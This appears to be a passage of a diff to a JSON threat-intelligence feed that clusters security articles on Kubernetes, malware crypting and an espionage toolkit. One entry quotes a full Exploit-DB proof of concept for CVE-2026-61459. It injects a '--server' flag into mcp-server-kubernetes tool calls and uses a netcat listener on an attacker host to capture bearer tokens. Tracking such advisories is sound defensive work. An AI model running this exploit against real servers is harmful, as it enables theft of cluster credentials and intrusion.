-          "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Kubernetes",
-              "Anthropic/Claude",
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-61459"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "poc_available",
-              "critical_cvss"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "Kubernetes": "target",
-              "Anthropic/Claude": "target",
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Google Cloud Security",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices",
-          "link": "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/",
-          "published": "2026-08-10T16:00:00+00:00",
-          "summary": "Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Kubernetes"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Kubernetes": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "44ffee7a7d",
       "priority_score": 16,
       "member_count": 3,
@@ -3318,6 +3301,147 @@
             "confidence_tier": "tier_4_news",
             "role_map": {
               "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "c9f01215de",
+      "priority_score": 16,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "Kubernetes"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Anthropic/Claude",
+          "GitHub",
+          "Kubernetes"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-61459"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "critical_cvss",
+          "poc_available"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research",
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
+        "link": "https://www.exploit-db.com/exploits/52638",
+        "published": "2026-08-11T00:00:00+00:00",
+        "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description=\"CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection\") parser.add_argument(\"--target\", required=True, help=\"MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)\") parser.add_argument(\"--attacker\", required=True, help=\"Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)\") parser.add_argument(\"--tool\", default=\"kubectl_get\", choices=[\"kubectl_get\", \"kubectl_describe\", \"kubectl_delete\"], help=\"Tool to exploit\") parser.add_argument(\"--namespace\", default=\"default\", help=\"Kubernetes namespace\") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { \"jsonrpc\": \"2.0\", \"method\": \"tools/call\", \"params\": { \"name\": args.tool, \"arguments\": { \"resourceType\": f\"--server={args.attacker}\", \"name\": \"dummy-pod\", \"namespace\": args.namespace, \"output\": \"json\" } }, \"id\": 1 } print(f\"[+] Sending exploit to {args.target} using {args.tool}\") print(f\"[+] Attacker server: {args.attacker}\") print(\"[+] Waiting for token exfiltration...\") try: response = requests.post( args.target, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=10 ) print(f\"[+] Response status: {response.status_code}\") if response.status_code == 200: print(\"[+] Exploit sent successfully. Check your listener for the bearer token!\") else: print(f\"[-] Unexpected response: {response.text[:500]}\") except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>\") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Kubernetes",
+            "Anthropic/Claude",
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-61459"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "poc_available",
+            "critical_cvss"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "Kubernetes": "target",
+            "Anthropic/Claude": "target",
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
+          "link": "https://www.exploit-db.com/exploits/52638",
+          "published": "2026-08-11T00:00:00+00:00",
+          "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Kubernetes",
+              "Anthropic/Claude",
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-61459"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "poc_available",
+              "critical_cvss"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "Kubernetes": "target",
+              "Anthropic/Claude": "target",
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Google Cloud Security",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices",
+          "link": "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/",
+          "published": "2026-08-10T16:00:00+00:00",
+          "summary": "Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Kubernetes"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Kubernetes": "target"
             },
             "weak_tags": {
               "products": []
@@ -4882,180 +5006,6 @@
       ]
     },
     {
-      "cluster_id": "44f04ecb50",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Recorded Future",
-        "cohort": "threat_research_primary",
-        "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
-        "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
-        "published": "2026-08-13T00:00:00+00:00",
-        "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
-        "full_body": "Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Recorded Future",
-          "cohort": "threat_research_primary",
-          "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
-          "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
-          "published": "2026-08-13T00:00:00+00:00",
-          "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "1e8cbb1e90",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "web_shell_backdoor"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "education",
-          "government"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "threat_research"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Kaspersky Securelist",
-        "cohort": "threat_research_primary",
-        "title": "Armored Likho expands its cyber-espionage toolkit",
-        "link": "https://securelist.com/armored-likho-still-toolkit/121033/",
-        "published": "2026-08-13T08:00:15+00:00",
-        "summary": "Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.",
-        "full_body": "Table of Contents Background Initial infection Still Sync How it works Telegram data collection Still Audio The eavesdropping process Infrastructure Victims Attribution Takeaways Indicators of compromise Authors Konstantin Isakov In May 2026, we discovered a new cyber-espionage campaign by the Armored Likho group, also known as Eagle Werewolf, that targets private individuals and organizations across various industries in Russia, including major corporations, the public sector, IT, and education. The attackers used a fake app as bait that mimics a service for donations. However, the most interesting part of this campaign isn’t the initial infection method – it’s the malicious implants the attackers use for cyber-espionage. We’ve written previously about recent Armored Likho attacks, but our analysis shows that the campaign discussed below has more in common with the group’s activity from February . That said, the attackers have significantly expanded their arsenal. During our research, we found a new cyber-espionage toolkit written in Rust: the Still Toolkit . One of its components, Still Sync , steals Telegram session data to gain ongoing access to the victim’s account. With this stolen data, attackers can leverage the Telegram API to automatically pull chat logs, media files, and other information from the account. The second component, Still Audio , is an implant for covert audio surveillance. It analyzes the incoming audio stream, automatically detects speech, records conversations, and sends the recordings to a command-and-control server. In this article, we’ll look at the initial infection method, how the new Still Toolkit components are built, and the technical details of how they operate. Kaspersky products detect this threat as Trojan.Win64.Agent.* and HEUR:Backdoor.Win32.Generic . Background Armored Likho’s malicious activity has been documented several times before: in November 2024, and in February and July 2026. The current campaign shows significant overlap with the November and February campaigns, which used malicious droppers disguised as documents and applications related to Starlink activation or fundraising efforts as the initial infection vector. This campaign also uses fundraising as its lure. At the same time, our research uncovered a number of new tools that point to the attackers expanding their capabilities. Initial infection The infection chain starts with an app that mimics a donation service. As of this writing, the app distribution method remains unknown. During our research, however, we obtained several samples posing as apps from different Russian foundations. In reality, the app is a dropper. Its developers wrote it in Rust on top of the popular Tauri framework, and it has a graphical interface designed to deceive the user. After launch, it displays a login form that asks for a password, presumably one the attackers supplied. The login form After the user enters a valid password, they see a catalog of donatable items. The app pulls item and category information from orderapiserver[.]info through the public/categories and public/products endpoints . A clickable catalog makes the app look legitimate. While the user browses the items, the dropper quietly decrypts and launches the payload for the next stage in the background. Our analysis shows that the mechanism for decrypting the payload and launching subsequent stages hasn’t changed since the February campaign. However, we found a new cyber-espionage toolkit – the Still Toolkit – made up of two components: Still Sync and Still Audio. Still Sync Still Sync is a stealer written in Rust that steals Telegram session data. However, its capabilities don’t stop there. With this stolen data, Sync can log in to the victim’s account and pull messages and media files through the Telegram API. Architecturally, Sync is an asynchronous application based on the Tokio library. It talks to the server over gRPC and serializes messages with FlatBuffers . It support",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "apt_espionage",
-            "web_shell_backdoor"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government",
-            "education"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "threat_research",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Kaspersky Securelist",
-          "cohort": "threat_research_primary",
-          "title": "Armored Likho expands its cyber-espionage toolkit",
-          "link": "https://securelist.com/armored-likho-still-toolkit/121033/",
-          "published": "2026-08-13T08:00:15+00:00",
-          "summary": "Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.",
-          "taxonomy": {
-            "threat_categories": [
-              "apt_espionage",
-              "web_shell_backdoor"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government",
-              "education"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "threat_research",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "2a12c51464",
       "priority_score": 10,
       "member_count": 1,
@@ -5292,91 +5242,93 @@
       ]
     },
     {
-      "cluster_id": "af5513db44",
+      "cluster_id": "1e8cbb1e90",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "apt_espionage",
+          "web_shell_backdoor"
+        ],
         "actor_attribution": [],
-        "affected_industries": [],
+        "affected_industries": [
+          "education",
+          "government"
+        ],
         "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
-          "news_report"
+          "threat_research"
         ],
         "confidence_tier": [
-          "tier_1_offensive_research"
+          "tier_1_primary_research"
         ]
       },
       "primary": {
-        "source": "Horizon3 Attack Research",
-        "cohort": "offensive_vulnerability_research",
-        "title": "From Scanner Findings to Verifiable Web Application Risk",
-        "link": "https://horizon3.ai/customer-story/cloud-native-webapp-security-validation/",
-        "published": "2026-08-11T17:07:51+00:00",
-        "summary": "See how a cloud-native merchandise returns technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers evidence they could act on.",
-        "full_body": "From Scanner Findings to Verifiable Web Application Risk Horizon3 Customer Stories Web application scanners can surface potential vulnerabilities. They don’t always prove what attackers can actually exploit or give developers the evidence they need to act. A cloud-native merchandise returns technology provider needed a better way to continuously validate application risk across an AWS-heavy environment while helping security and engineering teams reach the same conclusions faster. This customer story explores how the company expanded its use of NodeZero® from infrastructure validation into continuous autonomous WebApp pentesting, creating a shared, evidence-driven view of exploitable risk. Key Insight Traditional scanners and periodic pentests generated findings, but the security team needed stronger proof of what was truly exploitable and a better way to communicate that risk to developers. By adopting NodeZero and NodeZero WebApp, the organization gained: Continuous validation across cloud infrastructure and web applications Clearer visibility into exploitable application risk Evidence developers and security teams could evaluate together Greater insight into how credentials and cloud assets compound risk Scalable WebApp testing across a growing application portfolio Less reliance on abstract severity ratings and static reports What You’ll Learn Why traditional scanner findings can create friction between security and development teams How autonomous WebApp pentesting validates what is actually exploitable How attack-path evidence helps teams understand compounded cloud risk Why route-level proof can make application security findings easier for developers to act on How continuous testing fits an AWS-heavy, cloud-native operating model How security teams can move from interpreting scanner noise to reviewing verifiable evidence Why autonomous pentesting can create a shared view of risk across security and engineering Why It Matters Cloud-native environments change quickly. Applications evolve, infrastructure shifts, identities connect systems, and customer-facing services remain directly tied to the business. For lean security teams responsible for cloud, infrastructure, AppSec, privacy, and compliance, identifying another potential vulnerability isn’t enough. They need to know whether it can actually be exploited and give developers evidence that makes the path to remediation clear. This organization moved beyond periodic reports toward continuous, evidence-driven validation. After about a dozen early NodeZero tests, the team expanded to nearly 30 autonomous WebApp pentesting campaigns across more than 20 applications, creating a more practical way for security and engineering to understand and act on real risk. Download the customer story to see how a cloud-native technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers verifiable evidence they could act on. Download the customer story How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:",
+        "source": "Kaspersky Securelist",
+        "cohort": "threat_research_primary",
+        "title": "Armored Likho expands its cyber-espionage toolkit",
+        "link": "https://securelist.com/armored-likho-still-toolkit/121033/",
+        "published": "2026-08-13T08:00:15+00:00",
+        "summary": "Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.",
+        "full_body": "Table of Contents Background Initial infection Still Sync How it works Telegram data collection Still Audio The eavesdropping process Infrastructure Victims Attribution Takeaways Indicators of compromise Authors Konstantin Isakov In May 2026, we discovered a new cyber-espionage campaign by the Armored Likho group, also known as Eagle Werewolf, that targets private individuals and organizations across various industries in Russia, including major corporations, the public sector, IT, and education. The attackers used a fake app as bait that mimics a service for donations. However, the most interesting part of this campaign isn’t the initial infection method – it’s the malicious implants the attackers use for cyber-espionage. We’ve written previously about recent Armored Likho attacks, but our analysis shows that the campaign discussed below has more in common with the group’s activity from February . That said, the attackers have significantly expanded their arsenal. During our research, we found a new cyber-espionage toolkit written in Rust: the Still Toolkit . One of its components, Still Sync , steals Telegram session data to gain ongoing access to the victim’s account. With this stolen data, attackers can leverage the Telegram API to automatically pull chat logs, media files, and other information from the account. The second component, Still Audio , is an implant for covert audio surveillance. It analyzes the incoming audio stream, automatically detects speech, records conversations, and sends the recordings to a command-and-control server. In this article, we’ll look at the initial infection method, how the new Still Toolkit components are built, and the technical details of how they operate. Kaspersky products detect this threat as Trojan.Win64.Agent.* and HEUR:Backdoor.Win32.Generic . Background Armored Likho’s malicious activity has been documented several times before: in November 2024, and in February and July 2026. The current campaign shows significant overlap with the November and February campaigns, which used malicious droppers disguised as documents and applications related to Starlink activation or fundraising efforts as the initial infection vector. This campaign also uses fundraising as its lure. At the same time, our research uncovered a number of new tools that point to the attackers expanding their capabilities. Initial infection The infection chain starts with an app that mimics a donation service. As of this writing, the app distribution method remains unknown. During our research, however, we obtained several samples posing as apps from different Russian foundations. In reality, the app is a dropper. Its developers wrote it in Rust on top of the popular Tauri framework, and it has a graphical interface designed to deceive the user. After launch, it displays a login form that asks for a password, presumably one the attackers supplied. The login form After the user enters a valid password, they see a catalog of donatable items. The app pulls item and category information from orderapiserver[.]info through the public/categories and public/products endpoints . A clickable catalog makes the app look legitimate. While the user browses the items, the dropper quietly decrypts and launches the payload for the next stage in the background. Our analysis shows that the mechanism for decrypting the payload and launching subsequent stages hasn’t changed since the February campaign. However, we found a new cyber-espionage toolkit – the Still Toolkit – made up of two components: Still Sync and Still Audio. Still Sync Still Sync is a stealer written in Rust that steals Telegram session data. However, its capabilities don’t stop there. With this stolen data, Sync can log in to the victim’s account and pull messages and media files through the Telegram API. Architecturally, Sync is an asynchronous application based on the Tokio library. It talks to the server over gRPC and serializes messages with FlatBuffers . It support",
         "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "apt_espionage",
+            "web_shell_backdoor"
+          ],
           "actor_attribution": [],
-          "affected_industries": [],
+          "affected_industries": [
+            "government",
+            "education"
+          ],
           "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "AWS": "mention"
-          },
+          "content_type": "threat_research",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
           "weak_tags": {
-            "products": [
-              [
-                "AWS",
-                "mention",
-                0.25
-              ]
-            ]
+            "products": []
           }
         }
       },
       "corroborating_sources": [
         {
-          "source": "Horizon3 Attack Research",
-          "cohort": "offensive_vulnerability_research",
-          "title": "From Scanner Findings to Verifiable Web Application Risk",
-          "link": "https://horizon3.ai/customer-story/cloud-native-webapp-security-validation/",
-          "published": "2026-08-11T17:07:51+00:00",
-          "summary": "See how a cloud-native merchandise returns technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers evidence they could act on.",
+          "source": "Kaspersky Securelist",
+          "cohort": "threat_research_primary",
+          "title": "Armored Likho expands its cyber-espionage toolkit",
+          "link": "https://securelist.com/armored-likho-still-toolkit/121033/",
+          "published": "2026-08-13T08:00:15+00:00",
+          "summary": "Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "apt_espionage",
+              "web_shell_backdoor"
+            ],
             "actor_attribution": [],
-            "affected_industries": [],
+            "affected_industries": [
+              "government",
+              "education"
+            ],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "AWS": "mention"
-            },
+            "content_type": "threat_research",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
             "weak_tags": {
-              "products": [
-                [
-                  "AWS",
-                  "mention",
-                  0.25
-                ]
-              ]
+              "products": []
             }
           }
         }
@@ -5599,6 +5551,178 @@
               "Azure": "target",
               "Kubernetes": "target"
             },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "af5513db44",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Horizon3 Attack Research",
+        "cohort": "offensive_vulnerability_research",
+        "title": "From Scanner Findings to Verifiable Web Application Risk",
+        "link": "https://horizon3.ai/customer-story/cloud-native-webapp-security-validation/",
+        "published": "2026-08-11T17:07:51+00:00",
+        "summary": "See how a cloud-native merchandise returns technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers evidence they could act on.",
+        "full_body": "From Scanner Findings to Verifiable Web Application Risk Horizon3 Customer Stories Web application scanners can surface potential vulnerabilities. They don’t always prove what attackers can actually exploit or give developers the evidence they need to act. A cloud-native merchandise returns technology provider needed a better way to continuously validate application risk across an AWS-heavy environment while helping security and engineering teams reach the same conclusions faster. This customer story explores how the company expanded its use of NodeZero® from infrastructure validation into continuous autonomous WebApp pentesting, creating a shared, evidence-driven view of exploitable risk. Key Insight Traditional scanners and periodic pentests generated findings, but the security team needed stronger proof of what was truly exploitable and a better way to communicate that risk to developers. By adopting NodeZero and NodeZero WebApp, the organization gained: Continuous validation across cloud infrastructure and web applications Clearer visibility into exploitable application risk Evidence developers and security teams could evaluate together Greater insight into how credentials and cloud assets compound risk Scalable WebApp testing across a growing application portfolio Less reliance on abstract severity ratings and static reports What You’ll Learn Why traditional scanner findings 